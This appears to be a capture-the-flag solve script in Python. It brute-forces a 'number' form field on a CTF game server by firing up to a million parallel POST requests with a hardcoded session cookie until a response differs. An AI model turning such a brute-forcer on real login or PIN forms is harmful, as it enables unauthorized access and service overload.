import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

# Define the URL for the POST request
url = 'http://mctf-game.ru:4000/'

# Define the headers to be sent with the request
headers = {
    'Host': 'mctf-game.ru:4000',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://mctf-game.ru:4000',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://mctf-game.ru:4000/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'PHPSESSID=c4ce6a9f0df1947789c3bd13d89c3214',
    'Connection': 'close'
}

# Define the data to be sent in the POST request
initial_data = {
    'number': "1"
}

# Make the initial POST request to get the fail response
response = requests.post(url, headers=headers, data=initial_data)
fail = response.text

def make_request(i):
    data = 'number='+str(i)
    response = requests.post(url, headers=headers, data=data)
    if response.text != fail:
        raise Exception(f'Found a different response: {response.text}  ' + str(i))

# Use ThreadPoolExecutor to make the requests in parallel
with ThreadPoolExecutor(max_workers=10) as executor:
    # Create a list of futures for the range of numbers
    futures = [executor.submit(make_request, i) for i in range(1, 1000000)]
    
    # Use tqdm to show progress
    for future in tqdm(futures):
        try:
            future.result()  # This will raise an exception if the request found a different response
        except Exception as e:
            print(e)
            break